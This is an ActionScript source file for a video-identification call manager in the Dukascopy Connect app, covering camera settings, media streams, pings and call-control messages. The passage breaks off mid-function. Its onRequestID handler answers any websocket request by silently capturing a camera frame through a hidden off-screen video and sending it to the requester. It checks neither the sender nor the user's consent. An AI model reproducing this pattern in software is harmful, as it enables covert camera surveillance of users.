package com.dukascopy.connect.sys.viManager 
{
	import com.adobe.crypto.MD5;
	import com.adobe.images.PNGEncoder;
	import com.dukascopy.connect.Config;
	import com.dukascopy.connect.MobileGui;
	import com.dukascopy.connect.data.RtoAgreementData;
	import com.dukascopy.connect.gui.lightbox.LightBox;
	import com.dukascopy.connect.screens.call.CallScreen;
	import com.dukascopy.connect.screens.call.TalkScreen;
	import com.dukascopy.connect.screens.call.TalkScreenRecognition;
	import com.dukascopy.connect.screens.call.VideoRecognitionScreen;
	import com.dukascopy.connect.screens.chat.main.VIChatScreen;
	import com.dukascopy.connect.screens.chat.video.FloatVideo;
	import com.dukascopy.connect.sys.auth.Auth;
	import com.dukascopy.connect.sys.callManager.EchoSuspension;
	import com.dukascopy.connect.sys.callManager.connection.WebRTCChannel;
	import com.dukascopy.connect.sys.connectionManager.NetworkManager;
	import com.dukascopy.connect.sys.crypter.Crypter;
	import com.dukascopy.connect.sys.deviceManager.DeviceManager;
	import com.dukascopy.connect.sys.dialogManager.DialogManager;
	import com.dukascopy.connect.sys.echo.echo;
	import com.dukascopy.connect.sys.idleManager.IdleManager;
	import com.dukascopy.connect.sys.nativeExtensionController.NativeExtensionController;
	import com.dukascopy.connect.sys.netStatus.NetStatus;
	import com.dukascopy.connect.sys.phonebookManager.PhonebookManager;
	import com.dukascopy.connect.sys.sound.SoundController;
	import com.dukascopy.connect.sys.ws.WS;
	import com.dukascopy.connect.sys.ws.WSClient;
	import com.dukascopy.connect.type.ChatInitType;
	import com.dukascopy.connect.vo.CallVO;
	import com.dukascopy.connect.vo.CamSettingVO;
	import com.dukascopy.connect.vo.screen.ChatScreenData;
	import com.dukascopy.langs.Lang;
	import com.greensock.TweenMax;
	import com.hurlant.util.Base64;
	import com.telefision.sys.signals.Signal;
	import flash.desktop.NativeApplication;
	import flash.desktop.SystemIdleMode;
	import flash.display.BitmapData;
	import flash.events.AsyncErrorEvent;
	import flash.events.Event;
	import flash.events.IOErrorEvent;
	import flash.events.NetDataEvent;
	import flash.events.NetStatusEvent;
	import flash.events.PermissionEvent;
	import flash.events.SecurityErrorEvent;
	import flash.events.StatusEvent;
	import flash.events.TimerEvent;
	import flash.media.AudioPlaybackMode;
	import flash.media.Camera;
	import flash.media.CameraPosition;
	import flash.media.Microphone;
	import flash.media.SoundCodec;
	import flash.media.SoundMixer;
	import flash.media.Video;
	import flash.net.NetConnection;
	import flash.net.NetStream;
	import flash.permissions.PermissionStatus;
	import flash.utils.Timer;

	
	/**
	 * ...
	 * @author Sergey Dobarin
	 */
	public class VideoConnection 
	{
			private const CALL_VERSION:int = 1;
			
			public const TYPE_INCOMING:String = "typeIncoming";
			public const TYPE_OUTGOING:String = "typeOutgoing";
			
			public const DOCUMENT_TYPE_PASSPORT:String = "docpass";
			public const DOCUMENT_TYPE_ID:String = "docid";
			
			public const MODE_AUDIO:String = "modeAudio";
			public const MODE_VIDEO:String = "modeVideo";
			
			public const QUALITY_LOW:String = "low";
			public const QUALITY_MEDIUM:String = "medium";
			public const QUALITY_HIGH:String = "high";
			public const QUALITY_FPS:String = "slideshow";
			
			public const STATUS_PLACED:String = "placed";
			public const STATUS_START:String = "start";
			public const STATUS_ACCEPTED:String = "accepted";
			public const STATUS_REJECTED:String = "rejected";
			public const STATUS_CANCELED:String = "canceled";
			public const STATUS_BUSY:String = "busy";
			public const STATUS_CANCELED_BY_SELF:String = "statusCanceledBySelf";
			
			public const NO_ANSWER_TIME:int = 45; //SEC
			public const MODE_SHOW_RTO_AGREEMENT:String = "call_rto";
			
			public var S_STREAM_READY:Signal = new Signal("VideoConnection.S_STREAM_READY");
			public var S_VIDEO_SIZE_CHANGED:Signal = new Signal("VideoConnection.S_STREAM_READY");
			public var S_CALLVO_CHANGED:Signal = new Signal("VideoConnection.S_CALLVO_CHANGED");
			public var S_CALL_STATUS_CHANGED:Signal = new Signal("VideoConnection.S_CALL_STATUS_CHANGED");
			public var S_DEBUG_MIC_VALUES:Signal = new Signal("VideoConnection.S_DEBUG_MIC_VALUES");
			public var S_SECURITY_CODE:Signal = new Signal("VideoConnection.S_SECURITY_CODE");
			public var S_HANGOUT:Signal = new Signal("VideoConnection.S_HANGOUT");
			public var S_CONNECT_ERROR:Signal = new Signal("VideoConnection.S_CONNECT_ERROR");
			
			public var clientID:String = "";
			
			private var totalVideoRecognitionStates:int = 3;
			
			private var inited:Boolean = false;
			private var callVO:CallVO;
			
			private var backScreen:Class;
			private var backScreenData:Object;
			
			// Network
			private var nc:NetConnection;
			private var incomeNS:NetStream;
			private var outgoingNS:NetStream;
			
			private var talkScreenShown:Boolean = false;
			
			// Microphone settings
			private var soundCodec:String = SoundCodec.SPEEX;
			private var framesPerPacket:int = 2;
			private var rate:int = 11;
			private var gain:int = 60;
			private var encodeQuality:int = 5;
			private var enhancedMic:Boolean = true;
			public var camera:Camera=null;
			public var microphone:Microphone = null;
			private var microphoneAttached:Boolean;
			private var microphoneMuted:Boolean;
			
			private var camsettings:/*CamSettingVO*/Array = [];
			public var currentCameraQuality:String = QUALITY_MEDIUM;
			
			private var lastPingTimer:Number = 0;
			private var pingTimer:Timer=null;
			private var pingDelay:int=1000 * 10;
			private var pingTimeout:int = 1000 * 30;
			private var videoControl:FloatVideo;
			private var streamID:String;
			private var connected:Boolean;
			
			public function VideoConnection(streamID:String) 
			{
				this.streamID = streamID;
				
				camsettings.push(new CamSettingVO(QUALITY_LOW, 362, 204, 15, 0, 90, 75)); 
				camsettings.push(new CamSettingVO(QUALITY_HIGH, 640, 360, 15, 0, 95, 60));
				camsettings.push(new CamSettingVO(QUALITY_FPS, 1920, 1080, 10, 0, 95, 10));
				camsettings.push(new CamSettingVO(QUALITY_MEDIUM, 480, 270, 15, 0, 95, 75));
			}
			
			private function init():void {
				if (inited)
					return;
				
				// CAMS FOR RECOGNITION
				camsettings.push(new CamSettingVO(QUALITY_LOW, 362, 204, 15, 0, 90, 75)); 
				camsettings.push(new CamSettingVO(QUALITY_HIGH, 640, 360, 15, 0, 95, 60));
				camsettings.push(new CamSettingVO(QUALITY_FPS, 1920, 1080, 10, 0, 95, 10));
				camsettings.push(new CamSettingVO(QUALITY_MEDIUM, 480, 270, 15, 0, 95, 75));
				inited = true;
				
				clientID = MD5.hash(new Date().getTime() + "" + Math.random() * 10000); // unique client ID 
				WSClient.S_RID.add(onRequestID);
			}
			
			//!TODO:?
			// MRZ SCANNER LOW QUALITY
			private function onRequestID(data:Object):void{
				try{
				var camname:String = null;
				if (data != null && "camname" in data)
					camname = data.camname;
				var cm:Camera = Camera.getCamera(camname);
				
				if(cm==null){
					WSClient.call_blackHole([data.sender],"rid_back",
								{
									err:"true",
									cams:Camera.names,
									bts:"no camera"
								}
							);
							
					return;
				}
				
				if("mode" in data && data.mode!=null){
					if("w" in data.mode && "h" in data.mode && "fps" in data.mode){
						cm.setMode(data.mode.w, data.mode.h, data.mode.fps);
					}
				}
				
				var video:Video = new Video();
				video.width = 1;
				video.height = 1;
				video.x =-100;
				video.y =-100;
				video.visible = false;
				var m:int = 255;
				var enterFrame:Function = function(e:Event):void{

					if (m <= 0 || video.videoWidth > 0){
						var vw:int = video.videoWidth;
						var vh:int = video.videoHeight;
						if(vw>0 && vh>0){
							var bmp:BitmapData = new BitmapData(vw,vh, false);
							bmp.draw(video);
							video.attachCamera(null);
							video.parent.removeChild(video);
							
							var err:Boolean = false;
							var bts:String = "";
							try{
								bts = Base64.encodeByteArray(PNGEncoder.encode(bmp));
							}catch(e:Error){
								bts = e.message;
							}
							WSClient.call_blackHole([data.sender],"rid_back",
								{
									err:err,
									cams:Camera.names,
									bts:bts
								}
							);
							bmp.dispose();
						}else{
							WSClient.call_blackHole([data.sender],"rid_back",
								{
									err:"true",
									cams:Camera.names,
									bts:"no video created"
								}
							);
						}
						
						video.removeEventListener(Event.ENTER_FRAME, enterFrame);
					}
					m--;
				};
				
				video.addEventListener(Event.ENTER_FRAME, enterFrame);
				video.attachCamera(cm);
				MobileGui.stage.addChild(video);
				}catch(e:Error){
					WS.send("blackhole", {
							mode:[data.sender],
							data:{
								method:"rid_back",
								err:true,
								bts:e.message
							}
						});
				}
			}
			
			private function onConnectionChanged():void{
				if (NetworkManager.isConnected == false)
					onWSDisconnected();
			}
			
			public function getCallVO():CallVO{
				return callVO;
			}
			
			private function onBlackHole(packet:Object):void {
				if ("data" in packet){
					if ("method" in packet.data){
						var method:String = packet.data.method;
						if (method != "call_documentType" &&
							method != "call_swipeCams" &&
							method != "call_changeQuality" &&
							method != "call_rstate" &&
							method != "call_pong" &&
							method != "call_ping" &&
							method != "call_broadcastMode" &&
							method != "call_changeMode" &&
							method != "call_check" &&
							method != "call_reject" &&
							method != 'call_accept' &&
							method != 'call_cancel' &&
							method != 'call_placed' &&
							method != 'call_received' &&
							method != 'call_secCode' &&
							method != 'call_rto' &&
							method != 'call_busy')
								return;
						var senderClientID:String = packet.data.data.clientID;
						var senderUID:String = packet.data.data.senderUID;
						var farCallID:String = packet.data.data.id;
						switch(method){
							case "call_ping":
								if (!checkCallVO(farCallID,"call_ping",senderUID))
									return;
									
								// TODO - если пинг идёт а соединения с woowza нет (был разрыв),
									
								lastPingTimer = new Date().getTime();
								return;
							break;
							// пакет приходит в момент активного звонка
							case "call_broadcastMode":
								// Режим broadcast`а изменился
								if (!checkCallVO(farCallID,"call_broadcastMode",senderUID))
									return;
								if ("data" in packet && "data" in packet.data && "mode" in packet.data.data)
									callVO.broadcastMode = packet.data.data.mode;
								if ("data" in packet && "data" in packet.data && "camW" in packet.data.data)
									callVO.broadcasterCameraW = packet.data.data.camW;
								if ("data" in packet && "data" in packet.data && "camH" in packet.data.data)
									callVO.broadcasterCameraH = packet.data.data.camH;
								if ("data" in packet && "data" in packet.data && "camR" in packet.data.data)
									callVO.broadcasterCameraR = packet.data.data.camR;
									
								S_CALLVO_CHANGED.invoke();
								echo("CallManager", "onBlackHole.call_broadcastMode", "Broadcaster mode changed");
								return;
							break;
							// Команда на изменение качества камеры
							case "call_changeQuality":
							
								if (!checkCallVO(farCallID,"call_changeQuality",senderUID))
									return;
									
								if ("data" in packet && "data" in packet.data && "quality" in packet.data.data)
									changeQuality(packet.data.data.quality);
									
								echo("CallManager", "onBlackHole.call_changeQuality", "Quality Changed");
								return;
							break;
							// Звонящий переключил document type
							case "call_documentType":
								if (!checkCallVO(farCallID,"call_documentType",senderUID))
									return;
								if ("data" in packet && "data" in packet.data && "documentType" in packet.data.data){
									var doctype:String = packet.data.data.documentType;
									if(doctype!=callVO.documentType){
										callVO.documentType = packet.data.data.documentType;
										if (MobileGui.centerScreen.currentScreenClass == VideoRecognitionScreen){
											var vrs:VideoRecognitionScreen = MobileGui.centerScreen.currentScreen as VideoRecognitionScreen;
											if(vrs!=null)
												vrs.showState(true);
										}
									}
								}
								echo("CallManager", "onBlackHole.call_documentType", "doc type: "+callVO.documentType);
								S_CALLVO_CHANGED.invoke();
							break;
							case "call_rto":
								if (!checkCallVO(farCallID,"call_rto",senderUID))
									return;
								if ("data" in packet && "data" in packet.data && "rto" in packet.data.data && packet.data.data.rto != null){
									callVO.rto = new RtoAgreementData(packet.data.data.rto);
									callVO.showAgreement = true;
								}
								echo("CallManager", "onBlackHole.call_rto");
								S_CALLVO_CHANGED.invoke();
							break;
							// VideoRecognition security code
							case "call_secCode":
								if ("data" in packet && "data" in packet.data && "secCode" in packet.data.data) {
									echo("CallManager", "onBlackHole.call_secCode", "secCode is: " + packet.data.data.secCode);
									S_SECURITY_CODE.invoke(packet.data.data.secCode);
								}
							break;
							// Звонящий переключил woki-toki
							case "call_swipeCams":
								if (!checkCallVO(farCallID,"call_swipeCams",senderUID))
									return;
								echo("CallManager", "onBlackHole.call_swipeCams", "wokitoki change");
								changeCamera();
								S_CALLVO_CHANGED.invoke();
							break;
							// Звонящий прекратил звонок
							case "call_cancel":
								if (!checkCallVO(farCallID,"call_cancel",senderUID))
									return;
								echo("CallManager", "onBlackHole.call_cancel", "Cancel call");
								S_CALL_STATUS_CHANGED.invoke(STATUS_CANCELED);
								resetCallVO();
							break;
							case "call_changeMode":
								if (!checkCallVO(farCallID,"call_changeMode",senderUID))
									return;
								if ("data" in packet && "data" in packet.data && "mode" in packet.data.data){
									echo("CallManager", "onBlackHole.call_changeMode", packet.data.data.mode);
									callVO.mode = packet.data.data.mode;
									callVO.loudspeaker = !callVO.mode == MODE_AUDIO;
									callVO.broadcastMode = callVO.mode;
									showCallScreen();
								}else{
									echo("CallManager", "onBlackHole.call_changeMode","no mode!",true);
								}
							break;
							// Change recognition state for call VO
							case "call_rstate":
								if (!checkCallVO(farCallID,"call_rstate",senderUID))
									return;
								if ("data" in packet && "data" in packet.data && "rstate" in packet.data.data){
									echo("CallManager", "onBlackHole.call_rstate", packet.data.data.rstate);
									callVO.recognitionState = packet.data.data.rstate;
									S_CALLVO_CHANGED.invoke();
								}else{
									echo("CallManager", "onBlackHole.call_rstate","no state!",true);
								}
							break;
							case "call_received":
								if (!checkCallVO(farCallID,"call_received",senderUID))
									return;
								// Убираем таймер дозвона и таймер проверки доступности
								echo("CallManager", "onBlackHole.call_received", 'CALL WAS RECEIVED');
							break;
						}
					}
				}
			}
			
			private function findUser():void {
				if (callVO == null)
					return;
				if (callVO.entryPointID != 0)
					return;
				if (callVO.uid == null)
					return;
				if (callVO.name.substr(0, 4) != "user")
					return;
				var newName:String = callVO.name;
				while (newName.length > 0 && isNaN(Number(newName.charAt(0))))
					newName = newName.substr(1);
				if (isNaN(Number(newName)))
					return;
				var res:String = PhonebookManager.getUsernameByPhone(newName);
				if (res == "")
					return;
				callVO.name = res;
			}
			
			/**
			 * Запускаем таймер на проверку и отсылку ping`а
			 */
			private function startPingTimer():void {
			
				lastPingTimer = new Date().getTime();
				if (pingTimer == null){
					pingTimer = new Timer(pingDelay);				
					pingTimer.addEventListener(TimerEvent.TIMER, onPingTimer);
				}
				pingTimer.stop();
				pingTimer.reset();
				pingTimer.start();
			}
			
			/**
			 * Слушатель pingTimer, проверяет время последнего полученного пинга,
			 * если задержка в пределах нормы, шлёт пинг второй стороне
			 * @param	e TimerEvent
			 */
			private function onPingTimer(e:TimerEvent):void{
				var t:Number = new Date().getTime() - lastPingTimer;
				if (t> pingTimeout){
					echo("CallManager", "onPingTimer", 'Client unreachable! ' + t + " " + lastPingTimer);
				//	DialogManager.alert(Lang.information, callVO.name+' ' + Lang.userHasDisconnected);
					resetCallVO();
					return;
				}
				
				if (callVO == null || callVO.uid == null){
					pingTimer.stop();
					pingTimer.reset();
					pingTimer.start();
					return;
				}
				
				sendPing();
			}
			
			/**
			 * Проверяем пришедший по сети пакет на изменеие callVO
			 * должны совпасть callVO.id и user.uid
			 * @param	farCallID	String - id звонка
			 * @param	mname 		String - имя метода в blackHole
			 * @param	senderUID	String - uid отправителя
			 * @return	Boolean - результат проверки, если true - пакет предназначается текущему callVO
			 */
			
			private function checkCallVO(farCallID:String,mname:String,senderUID:String):Boolean{
				if (callVO == null){
					echo("CallManager","onBlackHole."+mname,"callVO is null");
					return false;
				}
								
				if (callVO.id != farCallID){
					echo("CallManager","onBlackHole."+mname+", different call.id",callVO.id+'!='+farCallID);
					return false;
				}
				
				if (callVO.uid != senderUID){
					echo("CallManager","onBlackHole."+mname+" different call.uid",callVO.uid+'!='+senderUID);
					return false;
				}
				
				return true;
			}
			
			public function connect(video:FloatVideo):void {
				videoControl = video;
				SoundController.stopAllSounds();
				callVO = new CallVO();
				
				callVO.mode = MODE_VIDEO;
				callVO.videoRecognition = true;
				callVO.name = "Dukascopy";
				
				callVO.reinit();
				
				callVO.type = TYPE_INCOMING;
				callVO.nearStreamID = streamID;
				callVO.loudspeaker = true;
				callVO.phase = -1;
				callVO.ver = CALL_VERSION;	
				callVO.nearEncMic = DeviceManager.supportsEnhancedMicrophone();
				
				//!TODO:;
			//	callVO.id = packet.data.data.id;
			//	callVO.uid =  packet.data.data.uid;
								/*if ("ip" in packet)
									callVO.remoteIP = packet.ip;
								if ("data" in packet && "data" in packet.data && "farVer" in packet.data.data)
									callVO.farVer = packet.data.data.farVer;
								if ("data" in packet && "data" in packet.data && "documentType" in packet.data.data)
									callVO.documentType = packet.data.data.documentType;
								if ("data" in packet && "data" in packet.data && "farEncMic" in packet.data.data)
									callVO.farEncMic = packet.data.data.farEncMic;
								if ("data" in packet && "data" in packet.data && "entryPointID" in packet.data.data)
									callVO.entryPointID = packet.data.data.entryPointID;
								if ("data" in packet && "data" in packet.data && "recognitionState" in packet.data.data)
									callVO.recognitionState = packet.data.data.recognitionState;
								if ("data" in packet && "data" in packet.data && "farID" in packet.data.data)
									callVO.farStreamID = packet.data.data.farID;
								if ("data" in packet && "data" in packet.data && "mode" in packet.data.data)
									callVO.mode = packet.data.data.mode;*/
				
				
				currentCameraQuality = QUALITY_MEDIUM;
				
				callVO.loudspeaker = true;			
				prepareMediaNetwork();
				
				S_CALLVO_CHANGED.invoke();
			}
			
			public function startRecognition():void{
				
				callVO.loudspeaker = true;
				switchSpkeakers(callVO.loudspeaker);
				
				currentCameraQuality = QUALITY_MEDIUM;
				
				S_CALLVO_CHANGED.invoke();
			}
			
			public function isMicrophoneMuted():Boolean{
				return microphoneMuted;
			}
			
			public function isMicrophoneAttached():Boolean{
				return microphoneAttached;
			}
			
			/**
			 * Переключить режим звонка (CallManager.MODE_...)
			 * @param	mode String CallManager.MODE_...
			 */
			public function changeCallMode(mode:String):void{
				if (callVO == null)
					return;
				if (callVO.type != TYPE_OUTGOING)
					return;
				if (mode != MODE_AUDIO &&  mode != MODE_VIDEO)
					return;
				callVO.mode = mode;
				callVO.loudspeaker = (callVO.mode == MODE_AUDIO)?false:true;
				if (callVO.mode == MODE_AUDIO)
					switchSpkeakers(false);
				else
					switchSpkeakers(true);
				S_CALLVO_CHANGED.invoke();
				sendChangeMode(Auth.uid);
			}
			
			// OVERRIDE PHASE NUM
			public function overridePhase(p:int =-1):void{
				// Не переключаем фазу, если микрофон активен
				if (microphoneMuted == false)
					return;
				if (callVO == null)
					return;
				callVO.phase = p;
				if (outgoingNS != null)
					outgoingNS.send("stop", true);
			}
			
			// закончили звонок
			public function finish():void {
				sendFinish();
				resetCallVO();
			}
			
			// Показываем экран
			private function showCallScreen():void{
				
				if(Config.PLATFORM_ANDROID)
					NativeApplication.nativeApplication.systemIdleMode = SystemIdleMode.KEEP_AWAKE;
				else
					IdleManager.keepAwake(true);
							
				
				switchSpkeakers(true);
			}
			
			// Работа экрана завершена, нужно его убрать и почистить данные в менеджере
			private function resetCallVO():void{
				echo("CallManager", "resetCallVO", "Removing call!");
				S_HANGOUT.invoke();
				if(Config.PLATFORM_ANDROID)
					NativeApplication.nativeApplication.systemIdleMode = SystemIdleMode.NORMAL;
						else
							IdleManager.keepAwake(false);
							
				echo("CallManager", "showCallScreen", "SystemIdle: "+NativeApplication.nativeApplication.systemIdleMode);
				if (pingTimer != null){
					pingTimer.stop();
					pingTimer.reset();
				}
				SoundController.stopAllSounds();
				switchSpkeakers(true);
				
				if (callVO != null)
					callVO.clear();
				
				closeMediaNetwork();
			}
			
			private function sendAccept(mode:String):void{
				if (WSClient.call_blackHole([callVO.uid, Auth.uid], "call_accept", { 
																						id:callVO.id,
																						clientID:clientID,
																						senderUID:Auth.uid,
																						mode:mode,
																						farID:callVO.nearStreamID,
																						farEncMic:callVO.farEncMic,
																						farVer:CALL_VERSION } ))
				{
					
				}
				else {
					
					onWSDisconnected();
				}
			}
			
			private function sendCancel():void{
				echo("CallManager", "sendCancel", "to: " + callVO.uid + ",clientID:" + clientID + ", senderUID:" + Auth.uid);
				if (!WSClient.call_blackHole([callVO.uid], "call_cancel", {id:callVO.id,clientID:clientID,senderUID:Auth.uid}))
					onWSDisconnected();
			}
			
			private function sendPing():void{
				echo("CallManager", "sendPing", "to: " + callVO.uid + ",clientID:" + clientID + ", senderUID:" + Auth.uid);
				if (!WSClient.call_blackHole([callVO.uid], "call_ping", {id:callVO.id,clientID:clientID,senderUID:Auth.uid}))
					onWSDisconnected();
			}

			private function sendBusy(userUID:String):void{
				if (!WSClient.call_blackHole([userUID], "call_busy", {id:callVO.id,clientID:clientID,senderUID:Auth.uid}))
					onWSDisconnected();
			}
			private function sendFinish():void{
				sendCancel();
			}
			
			private function sendChangeMode(targetUID:String):void{
				if (!WSClient.call_blackHole([callVO.uid], "call_changeMode", {id:callVO.id,clientID:clientID,senderUID:Auth.uid,uid:callVO.uid,mode:callVO.mode}))
					onWSDisconnected();
			}
			
			public function sendChangeQuality(quality:String):void{
				if (!WSClient.call_blackHole([callVO.uid], "call_changeQuality", {quality:quality,id:callVO.id,clientID:clientID,senderUID:Auth.uid}))
					onWSDisconnected();
			}
			
			private function sendCallReceived():void{
				if (!WSClient.call_blackHole([callVO.uid], "call_received", {id:callVO.id,clientID:clientID,senderUID:Auth.uid}))
					onWSDisconnected();
			}
			
			public function sendCallCheck(userUID:String):void{
				if (!WSClient.call_blackHole([userUID], "call_check", {id:callVO.id,clientID:clientID,senderUID:Auth.uid}))
					onWSDisconnected();
			}
			
			public function sendBroadcastMode():void{
				
				if (callVO == null)
					return;	
				
				var camW:int = (camera != null)?camera.width:0;
				var camH:int = (camera != null)?camera.height:0;
				var camR:int = 90;

				if (Config.PLATFORM_ANDROID && camera != null)
				{
					camR = NativeExtensionController.getCameraOrientation(camera.position == CameraPosition.FRONT);
				}
				else if (Config.PLATFORM_APPLE == true)
				{
					camR = 90;
				}
				
				echo("CallManager", "sendBroadcastMode", camW + " " + camH + " " + camR + " " + callVO.mode);
					
				if (!WSClient.call_blackHole([callVO.uid], "call_broadcastMode", {remoteQuality:currentCameraQuality,camW:camW,camH:camH,camR:camR,mode:callVO.mode,id:callVO.id,clientID:clientID,senderUID:Auth.uid}))
					onWSDisconnected();
					
				echo("CallManager","sendBroadcastMode","completed");
			}
			
			public function getBroadcastMode():Object
			{
				if (callVO == null)
					return null;	
				
				var camW:int = (camera != null)?camera.width:0;
				var camH:int = (camera != null)?camera.height:0;
				var camR:int = 90;
				
				if (Config.PLATFORM_ANDROID && camera != null)
				{
					camR = NativeExtensionController.getCameraOrientation(camera.position == CameraPosition.FRONT);
				}
				else if (Config.PLATFORM_APPLE == true)
				{
					camR = 90;
				}
				
				return  {
							remoteQuality:currentCameraQuality,
							camW:camW,
							camH:camH,
							camR:camR
						};
			}
			
			public function sendRecognitionState(state:int):void{
				if (callVO == null)
					return;	
				echo("CallManager","sendRecognitionState",state);
				if (!WSClient.call_blackHole([callVO.uid], "call_rstate", {rstate:state,id:callVO.id,clientID:clientID,senderUID:Auth.uid}))
					onWSDisconnected();
			}
			
			private function onWSDisconnected():void 
			{
				//!TODO:?;
			}
			
			// Подготавливаем media соединение
			private function prepareMediaNetwork():void{
				closeMediaNetwork();
				echo("CallManager", "prepareMediaNetwork");
				try {
					nc = new NetConnection();
					nc.addEventListener(AsyncErrorEvent.ASYNC_ERROR, ncAsyncError);
					nc.addEventListener(IOErrorEvent.IO_ERROR, ncIoError);
					nc.addEventListener(NetStatusEvent.NET_STATUS,ncNetStatus)
					nc.addEventListener(SecurityErrorEvent.SECURITY_ERROR, ncSecError);
					if (callVO && callVO.videoRecognition == true) {
						nc.connect(Config.URL_MEDIA_VIDID);
					} else {
						nc.connect(Config.URL_MEDIA);
					}
				} catch (e:Error) {
					closeMediaNetwork();
					networkError(e.message);
				}
			}
			
			private function networkError(errorText:String):void 
			{
				S_CONNECT_ERROR.invoke(errorText);
			}
			
			// Закрываем меда соединение
			private function closeMediaNetwork():void{
				echo("CallManager", "closeMediaNetwork");
				if (nc != null) {
					try {
						nc.removeEventListener(AsyncErrorEvent.ASYNC_ERROR, ncAsyncError);
						nc.removeEventListener(IOErrorEvent.IO_ERROR, ncIoError);
						nc.removeEventListener(NetStatusEvent.NET_STATUS,ncNetStatus)
						nc.removeEventListener(SecurityErrorEvent.SECURITY_ERROR, ncSecError);
						nc.close();
					} catch (e:Error) {
						echo("CallManager", "closeMediaNetwork",e.message ,true);
					}
				}
				removeCamera();
				removeMicrophone();
				if (outgoingNS != null) {
					try {
						outgoingNS.removeEventListener(AsyncErrorEvent.ASYNC_ERROR, ncAsyncError);
						outgoingNS.removeEventListener(NetStatusEvent.NET_STATUS, ncNetStatus);
						outgoingNS.removeEventListener(StatusEvent.STATUS,nsStatus);
						outgoingNS.removeEventListener(NetDataEvent.MEDIA_TYPE_DATA, onNetData);
						outgoingNS.dispose();
					} catch(e:Error) {
						echo("CallManager", "closeMediaNetwork 2",e.message ,true);
					}
				}
				if (incomeNS != null) {
					try {
						incomeNS.removeEventListener(AsyncErrorEvent.ASYNC_ERROR, ncAsyncError);
						incomeNS.removeEventListener(NetStatusEvent.NET_STATUS, ncNetStatus);
						incomeNS.removeEventListener(StatusEvent.STATUS,nsStatus);
						incomeNS.removeEventListener(NetDataEvent.MEDIA_TYPE_DATA, onNetData);
						incomeNS.dispose();
					} catch(e:Error) {
						echo("CallManager", "closeMediaNetwork 3",e.message ,true);
					}
				}
				nc = null;
				outgoingNS = null;
				incomeNS = null;
				microphoneAttached = false;
				microphoneMuted = false;
				switchSpkeakers(true);// 
			}
			
			// начинаем broadcasting
			private function startPublishing():void {
				echo("CallManager", "startPublishing", "0");
				
				outgoingNS = new NetStream(nc);
				outgoingNS.addEventListener(AsyncErrorEvent.ASYNC_ERROR, ncAsyncError);
				outgoingNS.addEventListener(NetStatusEvent.NET_STATUS, ncNetStatus);
				outgoingNS.addEventListener(StatusEvent.STATUS,nsStatus);
				outgoingNS.addEventListener(NetDataEvent.MEDIA_TYPE_DATA, onNetData);
				outgoingNS.publish(callVO.nearStreamID);
				
				
				TweenMax.delayedCall(1, attachMedia, null, true);
				incomeNS = new NetStream(nc);
				incomeNS.addEventListener(AsyncErrorEvent.ASYNC_ERROR, ncAsyncError);
				incomeNS.addEventListener(NetStatusEvent.NET_STATUS, ncNetStatus);
				incomeNS.addEventListener(StatusEvent.STATUS,nsStatus);
				incomeNS.addEventListener(NetDataEvent.MEDIA_TYPE_DATA, onNetData);
				incomeNS.play("!"+callVO.nearStreamID);
				
				echo("CallManager", "startPublishing", "streams ready!");
				connected = true;
				S_STREAM_READY.invoke(streamID);
			}
			
			private function attachMedia():void{
				echo("CallManager", "attachMedia", "send broadcasting mode:" + callVO.mode);
				
				if (callVO.mode == MODE_VIDEO && callVO.supporter == false)
				{
					refreshCamera();
				}
					
				if (microphone != null && outgoingNS != null)
					outgoingNS.attachAudio(microphone);
						else
							switchSpkeakers(callVO.loudspeaker);
					
				
			//	sendBroadcastMode();
			}
			
			
			// создаем камеру
			private function createCamera():void{
				removeCamera();
				if (callVO == null)
					return;
				
				camera = videoControl.getCamera(callVO.cameraIndex);
				
				// WIFI CAMERA
				var l:int = camsettings.length;
				var cs:CamSettingVO;
				for (var n:int = 0; n < l; n++){
					cs = camsettings[n];
					if (cs.quality == currentCameraQuality)
						break;
				}
				
				if (cs == null)
					cs = camsettings[0];
				
				echo("CallManager", "createCamera", "Camera settings is: " + cs.toString());
				if (camera == null)
					return;
				camera.setMode(cs.cameraWidth, cs.cameraHeight,cs.cameraFps, true);
				camera.setQuality(cs.cameraBandwidth,cs.cameraQuality);
				camera.setKeyFrameInterval(cs.cameraKeyframeInterval);
				
				if (outgoingNS != null)
					outgoingNS.attachCamera(camera);
			}
				
			// Создаем микрофон
			private function createMicrophone():void{
				removeMicrophone();
				
				if (Microphone.isSupported == false)
					return;
					
				if(outgoingNS!=null)
					outgoingNS.attachAudio(microphone);
					
				microphoneAttached = true;
				microphoneMuted = false;
				echo("CallManager", "createMicrophone", "mic is: " + (microphone != null) + ", outNS is: " + (outgoingNS != null));
			}
			
			// отключаем камеру
			private function removeCamera():void{
				if (outgoingNS != null)
					outgoingNS.attachCamera(null);
			}
				
			// отключаем микрофон
			private function removeMicrophone():void{
				microphoneAttached = false;
				microphoneMuted = true;
				if (outgoingNS != null)
					outgoingNS.attachAudio(null);
				echo("CallManager", "removeMicrophone","mic is: "+(microphone!=null)+", outNS is: "+(outgoingNS!=null));
			}
			
			
			public function getIncomeStream():NetStream{
				return incomeNS;
			}
			
			public function getOutgoungStream():NetStream{
				return outgoingNS;
			}
			
			public function getCameraSetting():CamSettingVO{
				var n:int = 0;
				var l:int = camsettings.length;
				for (n; n < l; n++){
					if (camsettings[n].quality == currentCameraQuality){
						return camsettings[n];
					}
				}
				return camsettings[0];
			}
			
			/**
			 * Changing loudspeaker value
			 * @param	value int -1, switch, 0 - off, 1 - on
			 */
			public function changeLoudspeaker(value:int =-1):void{
				if (callVO == null || callVO.uid == null)
					return;
				callVO.loudspeaker = (value ==-1)? !callVO.loudspeaker:((value == 0)?false:true);
				switchSpkeakers(callVO.loudspeaker);
				S_CALLVO_CHANGED.invoke();
			}
			
			/**
			 * Меняем качество связи
			 * @param	val
			 */
			public function changeQuality(val:String):void{
				if (MobileGui.centerScreen.currentScreenClass != TalkScreenRecognition && MobileGui.centerScreen.currentScreenClass != TalkScreen && MobileGui.centerScreen.currentScreenClass != VideoRecognitionScreen && MobileGui.centerScreen.currentScreenClass != VIChatScreen)
					return;
				
				var l:int = camsettings.length;
				var wasFound:Boolean = false;
				for (var n:int = 0; n < l; n++){
					if (camsettings[n].quality == val){
						wasFound = true;
						break;
					}
				}
				
				if (!wasFound)
					val = camsettings[0].quality;
				
				currentCameraQuality = val;
				
				refreshCamera();
				
				S_CALLVO_CHANGED.invoke();
			//	sendBroadcastMode();
			}
			
			private function refreshCamera():void 
			{
				createCamera();
			}
			
			
			/**
			 * Mute/Unmute microphone (trigger)
			 */
			public function muteMicrophone():void{
				if (microphone == null)
					return;
				if (callVO == null)
					return;
				if (microphone.gain == 0)
					microphone.gain = gain;
						else
